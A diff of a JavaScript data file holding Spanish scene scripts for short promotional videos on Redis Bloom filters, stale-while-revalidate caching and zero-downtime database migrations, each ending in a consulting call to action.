-            "title": "ARRAY DE BITS Y CERO FALSOS NEGATIVOS",
-            "items": [
-              {
-                "name": "CLAVE: \"user_98412\"",
-                "addr": "3 FUNCIONES HASH",
-                "value": "Bits calculados: [14, 52, 88]",
-                "color": "#38bdf8"
-              },
-              {
-                "name": "ARRAY DE BITS EN RAM",
-                "addr": "BIT 52 = 0",
-                "value": "GARANTIZADO: El registro NO existe en disco",
-                "color": "#10b981"
-              }
-            ]
+            "mode": "bloom",
+            "badge": "ESTRUCTURA PROBABILÍSTICA",
+            "title": "FILTRO DE BLOOM EN MEMORIA",
+            "subtitle": "3 FUNCIONES HASH ILUMINANDO UN ARRAY DE BITS"
           }
         },
         {
-          "id": "bloom_code",
+          "id": "redis_code_bloom",
           "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Puede tener falsos positivos leves, pero jamás un falso negativo. Esto ahorra millones de lecturas innecesarias al disco en Cassandra y Redis.",
-          "visual_cue": "Terminal ejecutando comandos BF.EXISTS en Redis",
+          "duration": 5.5,
+          "voiceover": "La clave pasa por tres funciones hash que encienden bits en un vector binario. Si algún bit es cero, sabemos con certeza absoluta que el dato no existe.",
+          "visual_cue": "Terminal ejecutando comandos BF.ADD y BF.EXISTS en Redis",
           "props": {
-            "header": "REDIS BLOOM FILTER NATIVO",
-            "title": "CONSULTA DE EXISTENCIA EN SUB-MILISEGUNDO",
-            "filename": "cache/bloom.sh",
+            "header": "COMANDOS DE BLOOM EN REDIS",
+            "title": "VERIFICACIÓN EN TIEMPO O(1)",
+            "filename": "bloom_check.sh",
             "codeLines": [
-              "# Comprueba existencia en RAM sin tocar base de datos principal:",
-              "BF.ADD post_views \"usr_42:post_991\"",
-              "BF.EXISTS post_views \"usr_42:post_991\" -> (integer) 1",
-              "BF.EXISTS post_views \"usr_88:post_991\" -> (integer) 0",
-              "# 99% de lecturas a disco descartadas en memoria RAM"
+              "# Reservar filtro con 0.1% de error:",
+              "BF.RESERVE usernames 0.001 10000000",
+              "BF.ADD usernames \"edixon_dev\"",
+              "",
+              "# Comprobación instantánea:",
+              "BF.EXISTS usernames \"inexistent_user\" -> 0 (0ms disco)"
             ],
-            "cursorLine": 4
+            "cursorLine": 5
           }
         },
         {
-          "id": "cta_bloom",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño arquitecturas de caché y capas probabilísticas para reducir la carga de bases de datos. Link en mi perfil para auditar tu sistema.",
-          "visual_cue": "Cierre con llamado a auditoría de caché y performance",
+          "id": "metrics_bloom",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Evitas el noventa y nueve por ciento de las consultas pesadas a la base de datos ahorrando miles de dólares en servidores. Link en bio para optimizaciones.",
+          "visual_cue": "Comparativa de lecturas de disco ahorradas gracias al filtro probabilístico",
           "props": {
-            "header": "AUDITORÍA DE CACHÉ Y ALTO RENDIMIENTO",
-            "title": "PROTEGE TU BASE DE CONSULTAS INÚTILES",
-            "cta": {
-              "badge": "AUDITORÍA DE CACHÉ (Link en bio)",
-              "text": "¿Tu base de datos sufre por queries repetitivas? Link en mi perfil para auditar tu caché."
+            "header": "CONSULTORÍA EN ALGORITMOS (Link en bio)",
+            "metricA": {
+              "label": "CONSULTAS SQL A DISCO",
+              "value": "45.000 / seg",
+              "sub": "I/O intensivo saturando el SSD",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "CON FILTRO DE BLOOM",
+              "value": "450 / seg",
+              "sub": "99% resuelto en nanosegundos en RAM",
+              "color": "#10b981"
             }
           }
         }
@@ -3250,64 +2710,40 @@ window.__BIBLIOTECA_2026__ = [
     "group": "18. BLOOM FILTERS PROBABILISTIC",
     "label": "Var B (Polémico): Ahorra miles de dólares en queries usando filtros probabilísticos en Redis",
     "variation": "B (Polémico)",
-    "category": "ESTRUCTURAS DE DATOS & CACHÉ",
+    "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
     "manifest": {
       "title": "[18] Ahorra miles de dólares en queries usando filtros probabilísticos en Redis (Var B)",
-      "category": "ESTRUCTURAS DE DATOS & CACHÉ",
+      "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
       "slug": "18_bloom_filters_probabilistic",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "bloom_latency_hook",
-          "type": "latency_scale",
-          "duration": 6.5,
-          "voiceover": "Hacer consultas a tu base de datos relacional para comprobar si un registro existe está quemando tu presupuesto. Un filtro Bloom en Redis responde en microsegundos.",
-          "visual_cue": "Apertura directa con escala de latencia comparando RAM vs Query SQL",
+          "id": "bloom_shock_b",
+          "type": "cache_flow_viz",
+          "duration": 6,
+          "voiceover": "Tu base de datos pasa la mitad del tiempo buscando registros que ni siquiera existen en el sistema. Un filtro de Bloom detiene esas consultas en memoria.",
+          "visual_cue": "Visualizador del veredicto instantáneo de Bloom evitando consultas a disco",
           "props": {
-            "header": "TIEMPO DE RESPUESTA",
-            "title": "FILTRO EN MEMORIA VS BÚSQUEDA EN DISCO",
-            "subtitle": "COMPARATIVA DE LATENCIA DE COMPROBACIÓN",
-            "tiers": [
-              {
-                "name": "BLOOM FILTER EN RAM (REDIS)",
-                "latency": "0.05 ms",
-                "ratio": 0.1,
-                "color": "#10b981",
-                "human": "Microsegundos"
-              },
-              {
-                "name": "QUERY SQL CON ÍNDICE B-TREE",
-                "latency": "4.5 ms",
-                "ratio": 0.6,
-                "color": "#fbbf24",
-                "human": "90x más lento"
-              },
-              {
-                "name": "ESCANEO SIN ÍNDICE (TABLE SCAN)",
-                "latency": "120 ms",
-                "ratio": 1,
-                "color": "#ef4444",
-                "human": "Colapso de disco"
-              }
-            ],
-            "conclusion": "Descartas el 99% de las comprobaciones antes de tocar el motor de base de datos.",
-            "conclusionSub": "Menos consumo de CPU, menos IOPS y menor factura cloud."
+            "mode": "bloom",
+            "badge": "ZERO DISK I/O",
+            "title": "FILTRO PROBABILÍSTICO EN REDIS",
+            "subtitle": "DETIENE CONSULTAS INÚTILES ANTES DE TOCAR POSTGRES"
           }
         },
         {
-          "id": "cta_bloom_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito capas de persistencia y caching para reducir facturas y multiplicar la escala de tu producto. Contáctame en el link de la bio.",
-          "visual_cue": "Cierre con auditoría de base de datos y caché",
+          "id": "terminal_bloom_b",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Por solo unos megabytes de memoria proteges tu clúster principal y garantizas respuestas en microsegundos. Link en bio para auditar tu caché.",
+          "visual_cue": "Terminal mostrando benchmark de Bloom Filter y llamada a la acción en bio",
           "props": {
-            "header": "AUDITORÍA DE ESCALABILIDAD & COSTES",
-            "title": "OPTIMIZACIÓN DE CAPAS DE CACHÉ",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en bio)",
-              "text": "Reduce el estrés de tu base de datos y recorta costes. Agenda tu sesión en mi perfil."
-            }
+            "header": "AUDITORÍA DE INFRAESTRUCTURA (Link en bio)",
+            "title": "PROTECCIÓN DE BASE DE DATOS",
+            "leftTitle": "BENCHMARK DE CACHÉ",
+            "rightTitle": "BENEFICIOS CLAVE",
+            "leftText": "$ redis-benchmark -t bf.exists -q\n✔ Throughput: 124.000 ops/sec\n✔ Latencia media: 0.08 ms\n✔ 99.2% de lecturas a disco evitadas",
+            "rightText": "• Reduce el tamaño de tu clúster de DB\n• Desaparecen los timeouts en picos\n• Estructura ligera de pocos megabytes\n• ¿Evaluamos tu caso? Enlace en mi perfil"
           }
         }
       ]
@@ -3319,85 +2755,66 @@ window.__BIBLIOTECA_2026__ = [
     "group": "19. CACHE STALE WHILE REVALIDATE",
     "label": "Var A (Técnico): Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza",
     "variation": "A (Técnico)",
-    "category": "REDES & ARQUITECTURA DE CACHÉ",
+    "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
     "manifest": {
       "title": "[19] Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza (Var A)",
-      "category": "REDES & ARQUITECTURA DE CACHÉ",
+      "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
       "slug": "19_cache_stale_while_revalidate",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "stampede_flow_hook",
-          "type": "network_pipeline",
+          "id": "swr_flow_lead",
+          "type": "cache_flow_viz",
           "duration": 6.5,
-          "voiceover": "¿Qué pasa cuando la caché de tu página más visitada expira justo cuando entran diez mil usuarios a la vez? Tu servidor colapsa por una estampida de peticiones a la base de datos.",
-          "visual_cue": "Apertura directa con pipeline visual mostrando la avalancha de peticiones colapsando la base",
+          "voiceover": "Cuando la clave de caché de tu producto más vendido expira, diez mil peticiones simultáneas golpean la base de datos al mismo tiempo: eso es un Cache Stampede.",
+          "visual_cue": "Visualizador del ciclo de vida SWR y neutralización del Cache Stampede",
           "props": {
-            "header": "AVALANCHA DE PETICIONES",
-            "title": "CACHE MISS SIMULTÁNEO",
-            "subtitle": "10,000 CONEXIONES ATACANDO LA BASE DE DATOS",
+            "mode": "swr",
+            "badge": "RESILIENCIA EN ALTA ESCALA",
+            "title": "CICLO STALE-WHILE-REVALIDATE",
+            "subtitle": "RESPUESTAS EN 2 MS MIENTRAS UN WORKER REVALIDA DE FONDO"
+          }
+        },
+        {
+          "id": "pipeline_swr",
+          "type": "network_pipeline",
+          "duration": 5.5,
+          "voiceover": "Con el encabezado Stale-While-Revalidate, el primer usuario recibe el dato viejo en dos milisegundos mientras un proceso en segundo plano actualiza el valor sin bloquear a nadie.",
+          "visual_cue": "Tubería de red mostrando cómo los clientes reciben datos de caché sin esperar por la base de datos",
+          "props": {
+            "header": "FLUJO DE PETICIONES HTTP",
+            "title": "RESPUESTA INMEDIATA DESDE EL EDGE",
+            "latency": "2.1 ms",
             "stages": [
               {
-                "id": "users",
-                "label": "10,000 USUARIOS CONCURRENTES",
-                "sublabel": "Petición masiva en el segundo 00:00",
-                "y": 220,
-                "color": "#ef4444",
-                "metric": "10K RPS"
+                "name": "Edge Cache Hit",
+                "tag": "Stale data servido"
               },
               {
-                "id": "cdn",
-                "label": "CDN CACHE (EXPIRADA)",
-                "sublabel": "TTL agotado y deja pasar todo el tráfico",
-                "y": 520,
-                "color": "#fbbf24",
-                "metric": "Stampede"
+                "name": "Background Lock",
+                "tag": "1 sola query a DB"
               },
               {
-                "id": "db",
-                "label": "BASE DE DATOS EN COLAPSO",
-                "sublabel": "10,000 queries pesadas idénticas a la vez",
-                "y": 820,
-                "color": "#ef4444",
-                "metric": "CPU 100%"
+                "name": "Atomic Cache Swap",
+                "tag": "Nuevo valor disponible"
               }
             ]
           }
         },
         {
-          "id": "swr_solution",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Con Stale-While-Revalidate la CDN entrega el contenido en cinco milisegundos mientras un solo hilo actualiza la caché en segundo plano.",
-          "visual_cue": "Terminal configurando encabezado Cache-Control stale-while-revalidate",
-          "props": {
-            "header": "CABECERA HTTP PROTECTORA",
-            "title": "STALE-WHILE-REVALIDATE PATTERN",
-            "filename": "routes/products.ts",
-            "codeLines": [
-              "# Sirve respuesta anterior en 5ms y actualiza en background sin bloquear:",
-              "reply.header(\"Cache-Control\", ",
-              "  \"public, max-age=60, stale-while-revalidate=86400, stale-if-error=86400\"",
-              ");",
-              "# Resultado: Cero Cache Stampedes y rendimiento 100% estable"
-            ],
-            "cursorLine": 4
-          }
-        },
-        {
           "id": "cta_swr",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la arquitectura de caching y entrega de contenido en CDN para garantizar escalabilidad extrema en picos de tráfico. Enlace en mi bio.",
-          "visual_cue": "Cierre con llamado a auditoría de arquitectura y escalabilidad",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Diseño arquitecturas de caché resilientes para evitar caídas en eventos de alto tráfico. Link en mi perfil para auditar tu sistema.",
+          "visual_cue": "Terminal mostrando cabeceras HTTP de SWR y llamada a la acción en bio",
           "props": {
-            "header": "AUDITORÍA DE ESCALABILIDAD Y CACHING",
-            "title": "RESISTENCIA A PICOS MASIVOS DE TRÁFICO",
-            "cta": {
-              "badge": "AUDITORÍA DE ESCALABILIDAD (Link en bio)",
-              "text": "¿Tu web sufre caídas en picos de tráfico? Link en mi perfil para agendar tu diagnóstico."
-            }
+            "header": "CONSULTORÍA EN CACHÉ (Link en bio)",
+            "title": "ALTA DISPONIBILIDAD GARANTIZADA",
+            "leftTitle": "CABECERA HTTP DE RESPUESTA",
+            "rightTitle": "IMPACTO EN PRODUCCIÓN",
+            "leftText": "HTTP/2 200 OK\ncache-control: max-age=60, stale-while-revalidate=300\nx-cache-status: STALE (Background refreshed)\n✔ Tiempo de respuesta: 1.8 ms",
+            "rightText": "• Cero caídas por expiración de caché\n• 100% de peticiones en < 5ms\n• Base de datos protegida ante avalanchas\n• Contacto para auditoría: link en bio"
           }
         }
       ]
@@ -3409,49 +2826,40 @@ window.__BIBLIOTECA_2026__ = [
     "group": "19. CACHE STALE WHILE REVALIDATE",
     "label": "Var B (Polémico): Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados",
     "variation": "B (Polémico)",
-    "category": "REDES & ARQUITECTURA DE CACHÉ",
+    "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
     "manifest": {
       "title": "[19] Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados (Var B)",
-      "category": "REDES & ARQUITECTURA DE CACHÉ",
+      "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
       "slug": "19_cache_stale_while_revalidate",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "metrics_swr_hook",
-          "type": "metrics_comparison",
-          "duration": 6.5,
-          "voiceover": "No necesitas pagar un clúster de Redis para que tu web vuele. El encabezado Stale-While-Revalidate en el Edge reduce la carga de base de datos en un noventa y ocho por ciento.",
-          "visual_cue": "Apertura directa con métricas de descarga de servidor y latencia TTFB",
+          "id": "swr_shock_b",
+          "type": "cache_flow_viz",
+          "duration": 6,
+          "voiceover": "Creer que una caché rápida siempre devuelve datos viejos es un error. Con la técnica adecuada entregas contenido en dos milisegundos y mantienes los datos frescos.",
+          "visual_cue": "Visualizador del reemplazo atómico de datos en caché",
           "props": {
-            "header": "DESCARGA DE SERVIDOR DE ORIGEN",
-            "metricA": {
-              "label": "PETICIONES A BASE DE DATOS",
-              "value": "-98.4%",
-              "sub": "Solo una actualización en background por minuto",
-              "color": "#10b981"
-            },
-            "metricB": {
-              "label": "LATENCIA PERCIBIDA (TTFB)",
-              "value": "6ms p95",
-              "sub": "Servido directo desde el Edge más cercano",
-              "color": "#38bdf8"
-            }
+            "mode": "swr",
+            "badge": "LATENCIA HUMANA CERO",
+            "title": "FRESCURA ATÓMICA EN MEMORIA",
+            "subtitle": "SERVIDO DESDE EDGE/RAM SIN BLOQUEOS"
           }
         },
         {
-          "id": "cta_swr_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Optimizo la capa de borde y distribución de contenido para aplicaciones de alta concurrencia. Contáctame en el link de la bio.",
-          "visual_cue": "Cierre con consultoría de escalabilidad",
+          "id": "terminal_swr_b",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Aprovecha las capacidades nativas de HTTP y CDNs modernas sin meter capas complejas de software. Link en mi perfil para asesoría técnica.",
+          "visual_cue": "Terminal comparando latencia con SWR y llamada a la acción en bio",
           "props": {
-            "header": "CONSULTORÍA DE ESCALABILIDAD",
-            "title": "MÁXIMA VELOCIDAD Y MÍNIMO COSTE DE SERVIDOR",
-            "cta": {
-              "badge": "CONSULTORÍA DE ESCALABILIDAD (Link en perfil)",
-              "text": "Haz que tu backend soporte millones de visitas sin pestañear. Hablemos en mi perfil."
-            }
+            "header": "OPTIMIZACIÓN WEB (Link en bio)",
+            "title": "RESPUESTAS ULTRARRÁPIDAS",
+            "leftTitle": "CONSULTA TRADICIONAL",
+            "rightTitle": "ARQUITECTURA SWR",
+            "leftText": "Latencia: 340 ms (Consulta a disco)\nCPU del servidor: 78%\nBloqueo ante expiración de clave",
+            "rightText": "Latencia: 2.1 ms (Edge Cache)\nCPU del servidor: 2%\nRevalidación atómica sin interrupción"
           }
         }
       ]
@@ -3463,81 +2871,77 @@ window.__BIBLIOTECA_2026__ = [
     "group": "20. MIGRACIONES ZERO DOWNTIME",
     "label": "Var A (Técnico): El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime",
     "variation": "A (Técnico)",
-    "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
+    "category": "BASES DE DATOS & OPERACIONES EN VIVO",
     "manifest": {
       "title": "[20] El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime (Var A)",
-      "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
+      "category": "BASES DE DATOS & OPERACIONES EN VIVO",
       "slug": "20_migraciones_zero_downtime",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "expand_phases_hook",
-          "type": "architecture_flow",
+          "id": "stepper_expand_contract",
+          "type": "migration_stepper_viz",
           "duration": 6.5,
-          "voiceover": "¿Cómo renombrar una columna en cincuenta millones de filas sin provocar un solo error 500? Nunca lo hagas en un solo paso: usa el patrón Expand & Contract.",
-          "visual_cue": "Apertura directa con diagrama de las tres fases del patrón Expand & Contract",
+          "voiceover": "Modificar una columna en una tabla con cincuenta millones de filas puede bloquear toda tu aplicación. El patrón Expand and Contract elimina el riesgo por completo.",
+          "visual_cue": "Visualizador del patrón Expand & Contract con 4 fases progresivas en la tabla users",
           "props": {
-            "header": "LAS TRES FASES DEL PATRÓN",
-            "title": "TRANSICIÓN SEGURA DE ESQUEMA",
-            "nodes": [
-              {
-                "id": "f1",
-                "label": "1. FASE EXPAND",
-                "sublabel": "Añadir columna nueva vacía (Nullable) sin locks",
-                "color": "#38bdf8",
-                "y": 160
-              },
-              {
-                "id": "f2",
-                "label": "2. DOBLE ESCRITURA Y BACKFILL",
-                "sublabel": "La app escribe en ambas columnas y worker migra histórico",
-                "color": "#fbbf24",
-                "y": 520
-              },
-              {
-                "id": "f3",
-                "label": "3. FASE CONTRACT",
-                "sublabel": "La app solo lee la nueva y drop seguro de la columna vieja",
-                "color": "#10b981",
-                "y": 880
-              }
-            ]
+            "badge": "PATRÓN ARQUITECTÓNICO",
+            "title": "EXPAND & CONTRACT",
+            "subtitle": "MIGRACIONES EN 4 FASES SIN BLOQUEO DE TABLA"
           }
         },
         {
-          "id": "migration_sql",
+          "id": "sql_safe_code",
           "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Hacerlo por fases te permite revertir en cualquier instante sin poner en riesgo la disponibilidad del negocio ni corromper datos.",
-          "visual_cue": "Terminal mostrando script seguro de migración con pg_repack / gh-ost",
+          "duration": 5.5,
+          "voiceover": "Primero expandes agregando la nueva columna como nullable. Luego tu aplicación escribe en ambas columnas simultáneamente mientras un worker migra el histórico.",
+          "visual_cue": "Terminal mostrando las sentencias SQL seguras y el dual-write en código",
           "props": {
-            "header": "MIGRACIÓN CON CONTROL DE BLOQUEOS",
-            "title": "CERO EXCLUSIVE LOCKS EN TABLA",
-            "filename": "db/migrations/20261025_safe_column.sql",
+            "header": "SQL SEGURO EN PRODUCCIÓN",
+            "title": "MIGRACIÓN SIN BLOQUEOS EXCLUSIVOS",
+            "filename": "migrations/004_split_names.sql",
             "codeLines": [
-              "-- 1. Añade columna sin bloquear lectores ni escritores:",
-              "ALTER TABLE users ADD COLUMN phone_v2 VARCHAR(32);",
-              "-- 2. Backfill en lotes pequeños para no saturar transacciones:",
-              "UPDATE users SET phone_v2 = phone WHERE id BETWEEN $1 AND $2;",
-              "-- 3. Deploy de código con lectura de phone_v2"
+              "-- 1. EXPAND: Nueva columna nullable sin lock exclusivo",
+              "ALTER TABLE users ADD COLUMN first_name VARCHAR(128);",
+              "",
+              "-- 2. DUAL WRITE en la aplicación:",
+              "-- users.save({ full_name, first_name, last_name });"
             ],
             "cursorLine": 4
           }
         },
         {
-          "id": "cta_migration",
+          "id": "cta_migrations",
           "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Asesoro y acompaño a equipos en migraciones críticas de base de datos sin tiempo de inactividad. Agenda una sesión técnica en mi perfil.",
-          "visual_cue": "Cierre con consultoría de migración crítica",
+          "duration": 5.5,
+          "voiceover": "Finalmente contraes eliminando la columna antigua. Cero segundos de caída y rollback instantáneo garantizado. Link en bio para planificar migraciones críticas.",
+          "visual_cue": "Matriz comparativa entre ALTER TABLE directo vs Expand & Contract y llamada a la acción en bio",
           "props": {
-            "header": "CONSULTORÍA DE MIGRACIONES CRÍTICAS",
-            "title": "CAMBIOS DE ESQUEMA SIN TIEMPO DE CAÍDA",
-            "cta": {
-              "badge": "CONSULTORÍA DE DATOS (Link en bio)",
-              "text": "¿Planeas una migración compleja de base de datos? Link en mi perfil para acompañar a tu equipo."
-            }
+            "header": "CONSULTORÍA EN BASES DE DATOS (Link en bio)",
+            "title": "MIGRACIONES SEGURAS EN PRODUCCIÓN",
+            "colA": "EXPAND & CONTRACT",
+            "colB": "ALTER TABLE DIRECTO",
+            "rows": [
+              {
+                "dim": "Bloqueo exclusivo de tabla",
+                "a": "0 segundos (Sin locks)",
+                "b": "Minutos u horas de bloqueo",
+                "aGood": true
+              },
+              {
+                "dim": "Capacidad de Rollback",
+                "a": "Instantáneo sin drama",
+                "b": "Destructivo y arriesgado",
+                "aGood": true
+              },
+              {
+                "dim": "Disponibilidad de servicio",
+                "a": "100% de uptime en vivo",
+                "b": "Caída de servicio garantizada",
+                "aGood": true
+              }
+            ]
           }
         }
       ]
@@ -3549,62 +2953,39 @@ window.__BIBLIOTECA_2026__ = [
     "group": "20. MIGRACIONES ZERO DOWNTIME",
     "label": "Var B (Polémico): Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla",
     "variation": "B (Polémico)",
-    "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
+    "category": "BASES DE DATOS & OPERACIONES EN VIVO",
     "manifest": {
       "title": "[20] Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla (Var B)",
-      "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
+      "category": "BASES DE DATOS & OPERACIONES EN VIVO",
       "slug": "20_migraciones_zero_downtime",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "lock_split_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Hiciste un ALTER TABLE en producción y bloqueaste todas las lecturas y escrituras durante cuarenta minutos. Postgres adquiere un ACCESS EXCLUSIVE lock que frena cada petición.",
-          "visual_cue": "Apertura directa con terminal mostrando bloqueo infinito de tabla frente a migración segura con lock_timeout",
+          "id": "stepper_disaster_avoid",
+          "type": "migration_stepper_viz",
+          "duration": 6,
+          "voiceover": "Un simple ALTER TABLE adquiere un bloqueo exclusivo en PostgreSQL que encola todas las lecturas y escrituras, tirando tus servidores en segundos.",
+          "visual_cue": "Visualizador de prevención de bloqueos mediante fases progresivas",
           "props": {
-            "header": "MECANISMO DE BLOQUEO DE POSTGRES",
-            "title": "ACCESS EXCLUSIVE LOCK VS LOCK TIMEOUT",
-            "termA": {
-              "title": "MIGRACIÓN SIN TIMEOUT",
-              "color": "#ef4444",
-              "cmd": "ALTER TABLE orders ADD COLUMN status_code INT;",
-              "status": "Esperando lock indefinidamente",
-              "time": "Incidencia P1",
-              "lines": [
-                "Todas las queries entrantes se encolan detrás del ALTER",
-                "Pool de conexiones saturado al 100%",
-                "La aplicación completa deja de responder a usuarios"
-              ]
-            },
-            "termB": {
-              "title": "MIGRACIÓN CON DEFENSA",
-              "color": "#10b981",
-              "cmd": "SET lock_timeout = \"2s\"; ALTER TABLE orders ...",
-              "status": "Si no adquiere el lock en 2s, aborta limpiamente",
-              "time": "Zero caída",
-              "lines": [
-                "Reintenta con backoff en momentos de menor concurrencia",
-                "Los usuarios nunca notan degradación del servicio",
-                "Garantía total de disponibilidad"
-              ]
-            }
+            "badge": "ERROR FATAL EN PRODUCCIÓN",
+            "title": "EVITANDO BLOQUEOS EXCLUSIVOS",
+            "subtitle": "ALTER TABLE A CIEGAS = CAÍDA TOTAL DEL SERVICIO"
           }
         },
         {
-          "id": "cta_migration_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito planes de migración de datos y acompaño a startups en cambios estructurales de base de datos sin riesgo. Contáctame en el link de la bio.",
-          "visual_cue": "Cierre con consultoría de migración de bases de datos",
+          "id": "terminal_lock_monitor",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Usa herramientas de migración con algoritmos de tiempo compartido y divide los cambios en fases atómicas. Link en mi perfil para auditar tus esquemas.",
+          "visual_cue": "Terminal monitoreando bloqueos en pg_stat_activity y llamada a la acción en bio",
           "props": {
-            "header": "CONSULTORÍA DE MIGRACIONES SEGURAS",
-            "title": "PROTEGE TU DISPONIBILIDAD EN PRODUCCIÓN",
-            "cta": {
-              "badge": "AUDITORÍA DE MIGRACIONES (Link en bio)",
-              "text": "Evita caídas en tus cambios de esquema. Hablemos en el enlace de mi perfil."
-            }
+            "header": "AUDITORÍA DE BASE DE DATOS (Link en bio)",
+            "title": "MONITOREO DE LOCKS EN TIEMPO REAL",
+            "leftTitle": "PG_STAT_ACTIVITY",
+            "rightTitle": "BUENAS PRÁCTICAS",
+            "leftText": "$ psql -c \"SELECT pid, locktype, mode, granted FROM pg_locks;\"\n✔ AccessExclusiveLock evitado con éxito\n✔ Cola de peticiones: 0 bloqueadas\n✔ 100% de transacciones fluidas",
+            "rightText": "• Nunca agregues columnas con DEFAULT sin NOT NULL\n• Usa CREATE INDEX CONCURRENTLY\n• Migra datos históricos en lotes controlados\n• Asesoría técnica: enlace en mi bio"
           }
         }
       ]
